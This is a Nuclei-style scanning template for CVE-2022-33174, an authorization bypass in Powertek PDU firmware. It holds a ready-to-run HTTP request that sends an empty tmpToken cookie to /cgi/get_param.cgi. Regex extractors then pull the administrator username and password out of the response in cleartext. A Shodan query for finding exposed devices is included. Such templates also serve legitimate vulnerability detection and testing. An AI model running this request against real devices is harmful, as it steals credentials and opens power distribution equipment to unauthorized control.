id: CVE-2022-33174

info:
  name: Powertek firmware authorization bypass
  author: pikpikcu
  severity: high
  description: |
    Power Distribution Units running on Powertek firmware (multiple brands) before 3.30.30 allows remote authorization bypass in the web interface. To exploit the vulnerability, an attacker must send an HTTP packet to the data retrieval interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string followed by a semicolon. This bypasses an active session authorization check. This can be then used to fetch the values of protected sys.passwd and sys.su.name fields that contain the username and password in cleartext.
  reference:
    - https://gynvael.coldwind.pl/?lang=en&id=748
    - https://nvd.nist.gov/vuln/detail/CVE-2022-33174
  metadata:
    verified: true
    shodan-query: http.html:"Powertek"
  tags: cve,cve2022,powertek,auth-bypass

requests:
  - raw:
      - |
        GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1
        Host: {{Hostname}}
        Cookie: tmpToken=;

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '<sys.passwd>'
          - '<sys.su.name>'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '<sys\.passwd>([A-Z0-9a-z]+)<\/sys\.passwd>'
          - '<sys\.su\.name>([a-z]+)<\/sys\.su\.name>'
